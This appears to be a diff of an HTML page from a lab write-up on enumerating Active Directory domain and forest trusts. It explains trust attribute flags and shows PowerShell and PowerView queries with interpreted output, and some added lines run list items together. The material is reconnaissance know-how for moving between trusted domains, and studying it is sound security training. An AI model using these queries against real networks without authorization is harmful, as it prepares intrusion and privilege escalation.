-<ul>
-<li><strong>NON_TRANSITIVE</strong> (0x00000001) — The trust cannot be used transitively. That is, if DomainA trusts DomainB and DomainB trusts DomainC, then DomainA does not automatically trust DomainC. Also, if a trust is non-transitive, thenyou will not be able to query any Active Directory information from trusts up the chain from the non-transitive point. External trusts are implicitly non-transitive.</li>
-<li><strong>UPLEVEL_ONLY</strong> (0x00000002) — only Windows 2000 operating system and newer clients can use the trust.</li>
-<li><strong>QUARANTINED<em>DOMAIN </strong>(0x00000004) — SID filtering is enabled (more on this later). Output as <strong>FILTER</em>SIDS</strong> with PowerView for simplicity.</li>
-<li><strong>FOREST_TRANSITIVE</strong> (0x00000008) — cross-forest trust between the root of two domain forests running at least domain functional level 2003 or above.</li>
-<li><strong>CROSS<em>ORGANIZATION</strong> (0x00000010) — the trust is to a domain or forest that is not part of the organization, which adds the OTHER</em>ORGANIZATION SID. This is a bit of a weird one. </li>
-</ul>
-<p>According to this post it means that the selective authentication security protection is enabled. For more information, check out this MSDN doc.</p>
-<ul>
-<li><strong>WITHIN_FOREST</strong> (0x00000020) — the trusted domain is within the same forest, meaning a parent->child or cross-link relationship</li>
-<li><strong>TREAT<em>AS</em>EXTERNAL </strong>(0x00000040) — the trust is to be treated as external for trust boundary purposes. According to the documentation, “<em>If this bit is set, then a cross-forest trust to a domain is to be treated as an external trust for the purposes of SID Filtering. </em><strong>Cross-forest trusts are more stringently filtered than external trusts</strong><em>. This attribute relaxes those cross-forest trusts to be equivalent to external trusts.</em>” This sounds enticing, and I’m not 100% sure on the security implications of this statement ¯\<em>(ツ)</em>/¯ but I will update this post if anything new surfaces.</li>
-<li><strong>USES<em>RC4</em>ENCRYPTION </strong>(0x00000080) — if the TrustType is MIT, specifies that the trust that supports RC4 keys.</li>
-<li><strong>USES<em>AES</em>KEYS</strong> (0x00000100) — not listed in the linked Microsoft documentation, but according to some documentation I’ve been able to find online, it specifies that AES keys are used to encrypt KRB TGTs.</li>
-<li><strong>CROSS<em>ORGANIZATION</em>NO<em>TGT</em>DELEGATION</strong> (0x00000200) — “<em>If this bit is set, tickets granted under this trust MUST NOT be trusted for delegation.</em>” This is described more in [MS-KILE] 3.3.5.7.5 (Cross-Domain Trust and Referrals.)</li>
-<li><strong>PIM_TRUST</strong> (0x00000400) — “<em>If this bit and the TATE (treat as external) bit are set, then a cross-forest trust to a domain is to be treated as Privileged Identity Management trust for the purposes of SID Filtering.</em>” According to [MS-PAC] 4.1.2.2 (SID Filtering and Claims Transformation), “*A domain can be externally managed by a domain that is outside the forest. </li>
-</ul>
-<p>The trusting domain allows SIDs that are local to its forest to come over a PrivilegedIdentityManagement trust.*”</p>
-<p>Since we do have a 2-Ways or BiDirectional trust with an External Trust  <code>eu.local</code>, we can also query the Trusts <code>eu.local</code> have.</p>
-<p><code>Get-ADTrust -Filter * -Server eu.local</code></p>
 <img src="./images/screenshot_35.png" alt="image">
 <ul>
 <li><strong>(us.techcorp.local → eu.local)</strong> External Trust</li>
 <li><strong>Direction</strong>: Bidirectional → Mutual access between both domains.</li>
-<li><strong>Name</strong>: <code>us.techcorp.local</code> → A trusted domain external to <code>eu.local</code>.</li>
-<li><strong>IntraForest</strong>: <code>False</code> → Indicates an external trust, not part of the same forest.</li>
-<li><strong>ForestTransitive</strong>: <code>False</code> → Trust is not extended to other domains within the forests.</li>
-<li><strong>SIDFilteringForestAware</strong>: <code>True</code> → SID filtering is enabled, preventing privilege escalation through SID injection.</li>
-<li><strong>SIDFilteringQuarantined</strong>: <code>True</code> → Additional security measures are in place to block rogue SIDs.</li>
-<li><strong>Source</strong>: <code>DC=eu,DC=local</code> → The trust originates from <code>eu.local</code>.</li>
-<li><strong>Target</strong>: <code>us.techcorp.local</code> → Trust applies to this external domain.</li>
-<li><strong>TrustType</strong>: <strong>Uplevel</strong> → The trusted domain runs Active Directory.</li>
-<li><strong>SelectiveAuthentication</strong>: <code>False</code> → All authenticated users in <code>us.techcorp.local</code> can access resources in <code>eu.local</code> (permissions dependent).</li>
-<li><strong>(euvendor.local → eu.local)</strong> External Trust</li>
+<li><strong>Name</strong>: <code>us.techcorp.local</code> → A trusted domain external to <code>eu.local</code>. - <strong>IntraForest</strong>:<code>False</code>→ Indicates an external trust, not part of the same forest. - <strong>ForestTransitive</strong>:<code>False</code>→ Trust is not extended to other domains within the forests. - <strong>SIDFilteringForestAware</strong>:<code>True</code>→ SID filtering is enabled, preventing privilege escalation through SID injection. - <strong>SIDFilteringQuarantined</strong>:<code>True</code>→ Additional security measures are in place to block rogue SIDs. - <strong>Source</strong>:<code>DC=eu,DC=local</code> → The trust originates from <code>eu.local</code>. - <strong>Target</strong>:<code>us.techcorp.local</code>→ Trust applies to this external domain. - <strong>TrustType</strong>: <strong>Uplevel</strong> → The trusted domain runs Active Directory. - <strong>SelectiveAuthentication</strong>:<code>False</code> → All authenticated users in <code>us.techcorp.local</code> can access resources in <code>eu.local</code>(permissions dependent). - <strong>(euvendor.local → eu.local)</strong> External Trust We can see above that our Extrenal Trust <strong>eu.local</strong> also has some External Trusts with<code>eu.techcorp.local</code> (which is the domain we are currently) and  with <code>euvendor.local</code>. Now let’s say we want to enumerate the trusts of our root or Parent Domain (<code>techcorp.local</code>).<code>Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name</code></li>
 </ul>
 </ul>
-<p>We can see above that our Extrenal Trust <strong>eu.local</strong> also has some External Trusts with <code>eu.techcorp.local</code> (which is the domain we are currently) and  with <code>euvendor.local</code>.</p>
-<p>Now let’s say we want to enumerate the trusts of our root or Parent Domain (<code>techcorp.local</code>).</p>
-<p><code>Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name</code></p>
 <p>We can see above that our parent domain techcorp.local has 2 external Trust relationship.</p>
 <ul>
 <li><strong>Direction</strong>: Bidirectional → Mutual access between both domains.</li>
-<li><strong>Name</strong>: <code>euvendor.local</code> → Another external domain trusted by <code>eu.local</code>.</li>
-<li><strong>IntraForest</strong>: <code>False</code> → Indicates an external trust, not part of the same forest.</li>
-<li><strong>ForestTransitive</strong>: <code>True</code> → Trust extends across all domains in both forests.</li>
-<li><strong>SIDFilteringForestAware</strong>: <code>True</code> → SID filtering is enabled, ensuring security across the trust.</li>
-<li><strong>SIDFilteringQuarantined</strong>: <code>False</code> → SID filtering is enabled but not in quarantine mode.</li>
-<li><strong>Source</strong>: <code>DC=eu,DC=local</code> → The trust originates from <code>eu.local</code>.</li>
-<li><strong>Target</strong>: <code>euvendor.local</code> → Trust applies to this external domain.</li>
-<li><strong>TrustType</strong>: <strong>Uplevel</strong> → The trusted domain runs Active Directory.</li>
-<li><strong>SelectiveAuthentication</strong>: <code>False</code> → All authenticated users in <code>euvendor.local</code> can access resources in <code>eu.local</code> (permissions dependent).</li>
-<li><strong>(usvendor.local) External Trust</strong></li>
-<li><strong>Name</strong>: <code>usvendor.local</code> → Different domain from <code>Source</code>.</li>
-<li><strong>IntraForest</strong>: <code>False</code> → External trust.</li>
-<li><strong>ForestTransitive</strong>: <code>True</code> → Trust applies across all domains in both forests.</li>
-<li><strong>Direction</strong>: BiDirectional → Mutual access between both domains.</li>
-<li><strong>TrustType</strong>: <code>UPLEVEL (0x00000002)</code> - A trusted Windows domain that is running Active Directory.</li>
-<li><strong>SelectiveAuthentication</strong>: <code>False</code> → All authenticated users in the trusted domain can access resources in the trusting domain.</li>
-<li><strong>(bastion.local) External Trust</strong></li>
-<li><strong>Name</strong>: <code>bastion.local</code> → Different domain from <code>Source</code>.</li>
-<li><strong>IntraForest</strong>: <code>False</code> → External trust.</li>
-<li><strong>ForestTransitive</strong>: <code>True</code> → Trust applies across all domains in both forests.</li>
-<li><strong>Direction</strong>: Inbound → Only <code>techcorp.local</code> users can access <code>bastion.local</code>, but not the other way around.</li>
-<li><strong>TrustType</strong>: <code>UPLEVEL (0x00000002)</code> - A trusted Windows domain that is running Active Directory.</li>
-<li><strong>SelectiveAuthentication</strong>: <code>False</code> → All authenticated users in the trusted domain can access resources in the trusting domain.</li>
+<li><strong>Name</strong>: <code>euvendor.local</code> → Another external domain trusted by <code>eu.local</code>. - <strong>IntraForest</strong>:<code>False</code>→ Indicates an external trust, not part of the same forest. - <strong>ForestTransitive</strong>:<code>True</code>→ Trust extends across all domains in both forests. - <strong>SIDFilteringForestAware</strong>:<code>True</code>→ SID filtering is enabled, ensuring security across the trust. - <strong>SIDFilteringQuarantined</strong>:<code>False</code>→ SID filtering is enabled but not in quarantine mode. - <strong>Source</strong>:<code>DC=eu,DC=local</code> → The trust originates from <code>eu.local</code>. - <strong>Target</strong>:<code>euvendor.local</code>→ Trust applies to this external domain. - <strong>TrustType</strong>: <strong>Uplevel</strong> → The trusted domain runs Active Directory. - <strong>SelectiveAuthentication</strong>:<code>False</code> → All authenticated users in <code>euvendor.local</code> can access resources in <code>eu.local</code>(permissions dependent). - <strong>(usvendor.local) External Trust</strong> - <strong>Name</strong>:<code>usvendor.local</code> → Different domain from <code>Source</code>. - <strong>IntraForest</strong>:<code>False</code>→ External trust. - <strong>ForestTransitive</strong>:<code>True</code>→ Trust applies across all domains in both forests. - <strong>Direction</strong>: BiDirectional → Mutual access between both domains. - <strong>TrustType</strong>:<code>UPLEVEL (0x00000002)</code>- A trusted Windows domain that is running Active Directory. - <strong>SelectiveAuthentication</strong>:<code>False</code>→ All authenticated users in the trusted domain can access resources in the trusting domain. - <strong>(bastion.local) External Trust</strong> - <strong>Name</strong>:<code>bastion.local</code> → Different domain from <code>Source</code>. - <strong>IntraForest</strong>:<code>False</code>→ External trust. - <strong>ForestTransitive</strong>:<code>True</code>→ Trust applies across all domains in both forests. - <strong>Direction</strong>: Inbound → Only<code>techcorp.local</code> users can access <code>bastion.local</code>, but not the other way around. - <strong>TrustType</strong>:<code>UPLEVEL (0x00000002)</code>- A trusted Windows domain that is running Active Directory. - <strong>SelectiveAuthentication</strong>:<code>False</code> → All authenticated users in the trusted domain can access resources in the trusting domain.</li>
 </ul>
 </ul>
 <h3>Enumerating Trusts with PowerView</h3>
@@ -1144,34 +1012,19 @@
 <li><strong>PIM_TRUST</strong> (0x00000400) — “<em>If this bit and the TATE (treat as external) bit are set, then a cross-forest trust to a domain is to be treated as Privileged Identity Management trust for the purposes of SID Filtering.</em>” According to [MS-PAC] 4.1.2.2 (SID Filtering and Claims Transformation), “*A domain can be externally managed by a domain that is outside the forest. </li>
 </ul>
 <p>The trusting domain allows SIDs that are local to its forest to come over a PrivilegedIdentityManagement trust.*”</p>
-<p>Let’s now query all the External Trusts we do have from our current domain <code>eu.techcorp.local</code>.</p>
-<p><code>Get-ForestDomain -Verbose | Get-DomainTrust | ?{$<em>.TrustAttributes -eq 'FILTER</em>SIDS'}</code></p>
+<p>Let’s now query all the External Trusts we do have from our current domain <code>eu.techcorp.local</code>.<code>Get-ForestDomain -Verbose | Get-DomainTrust | ?{$<em>.TrustAttributes -eq 'FILTER</em>SIDS'}</code></p>
 <img src="./images/screenshot_37.png" alt="image">
 <h3><strong>(us.techcorp.local → eu.local) Domain Trust</strong></h3>
 <ul>
 <li><strong>Direction</strong>: Bidirectional → Mutual trust, allowing access between both domains.</li>
-<li><strong>SourceName</strong>: <code>us.techcorp.local</code> → The trust originates from <code>us.techcorp.local</code>.</li>
-<li><strong>TargetName</strong>: <code>eu.local</code> → The trust applies to the external domain <code>eu.local</code>.</li>
-<li><strong>TrustType</strong>: WINDOWS<em>ACTIVE</em>DIRECTORY → The trusted domain is running Active Directory.</li>
-<li><strong>TrustAttributes</strong>: FILTER_SIDS → SID filtering is enabled to protect against SID injection attacks.</li>
-<li><strong>WhenCreated</strong>: <code>7/13/2019 11:17:35 AM</code> → The trust was established on this date.</li>
-<li><strong>WhenChanged</strong>: <code>1/17/2025 5:06:16 AM</code> → The trust was last modified on this date.</li>
+<li><strong>SourceName</strong>: <code>us.techcorp.local</code> → The trust originates from <code>us.techcorp.local</code>. - <strong>TargetName</strong>:<code>eu.local</code> → The trust applies to the external domain <code>eu.local</code>. - <strong>TrustType</strong>: WINDOWS<em>ACTIVE</em>DIRECTORY → The trusted domain is running Active Directory. - <strong>TrustAttributes</strong>: FILTER_SIDS → SID filtering is enabled to protect against SID injection attacks. - <strong>WhenCreated</strong>:<code>7/13/2019 11:17:35 AM</code>→ The trust was established on this date. - <strong>WhenChanged</strong>:<code>1/17/2025 5:06:16 AM</code>→ The trust was last modified on this date. We can see above that we do have a BiDirectional Trust between<code>us.techcorp.local <---> eu.local</code>. Trust between<code>us.techcorp.local</code> and <code>eu.local</code>is a <strong>domain-level bidirectional trust</strong> with <strong>SID filtering enabled</strong> for security. This protects the trusting domain from SID injection attacks. Since we do have a 2-Ways or BiDirectional trust with an External Trust with<code>eu.local</code>, we can also query the Trust <code>eu.local</code>have.<code>Get-ForestTrust -Forest eu.local</code></li>
 </ul>
-<p>We can see above that we do have a BiDirectional Trust between <code>us.techcorp.local <---> eu.local</code>.</p>
-<p>Trust between <code>us.techcorp.local</code> and <code>eu.local</code> is a <strong>domain-level bidirectional trust</strong> with <strong>SID filtering enabled</strong> for security. This protects the trusting domain from SID injection attacks.</p>
-<p>Since we do have a 2-Ways or BiDirectional trust with an External Trust with<code>eu.local</code>, we can also query the Trust <code>eu.local</code> have.</p>
-<p><code>Get-ForestTrust -Forest eu.local</code></p>
 <img src="./images/screenshot_38.png" alt="image">
 <h3><strong>(euvendor.local → eu.local) Forest Trust</strong></h3>
 <ul>
 <li><strong>Direction</strong>: Bidirectional → Mutual access between both forests.</li>
-<li><strong>TopLevelNames</strong>: <code>{euvendor.local}</code> → Indicates the trusted top-level domain of the external forest.</li>
-<li><strong>ExcludedTopLevelNames</strong>: <code>{}</code> → No domains are excluded from this trust.</li>
-<li><strong>SourceName</strong>: <code>eu.local</code> → The trust originates from the <code>eu.local</code> forest.</li>
-<li><strong>TargetName</strong>: <code>euvendor.local</code> → The trust applies to the external forest <code>euvendor.local</code>.</li>
-<li><strong>TrustType</strong>: Forest → A forest-level trust that applies across all domains in both forests.</li>
+<li><strong>TopLevelNames</strong>: <code>{euvendor.local}</code>→ Indicates the trusted top-level domain of the external forest. - <strong>ExcludedTopLevelNames</strong>:<code>{}</code>→ No domains are excluded from this trust. - <strong>SourceName</strong>:<code>eu.local</code> → The trust originates from the <code>eu.local</code>forest. - <strong>TargetName</strong>:<code>euvendor.local</code> → The trust applies to the external forest <code>euvendor.local</code>. - <strong>TrustType</strong>: Forest → A forest-level trust that applies across all domains in both forests. Trust between<code>eu.local</code> and <code>euvendor.local</code> is a <strong>forest-level trust</strong> and is <strong>bidirectional</strong>, enabling resource sharing across all domains within both forests. No exclusions or limitations are applied to the trusted domains.</li>
 </ul>
-<p>Trust between <code>eu.local</code> and <code>euvendor.local</code> is a <strong>forest-level trust</strong> and is <strong>bidirectional</strong>, enabling resource sharing across all domains within both forests. No exclusions or limitations are applied to the trusted domains.</p>
 <p>We have now completed all the steps needed for a good enumeration inside our target environment.</p>
 <p>Let’s now move to the next step to explore some privilege escalation techniques.</p>
           <div class="part-navigation">
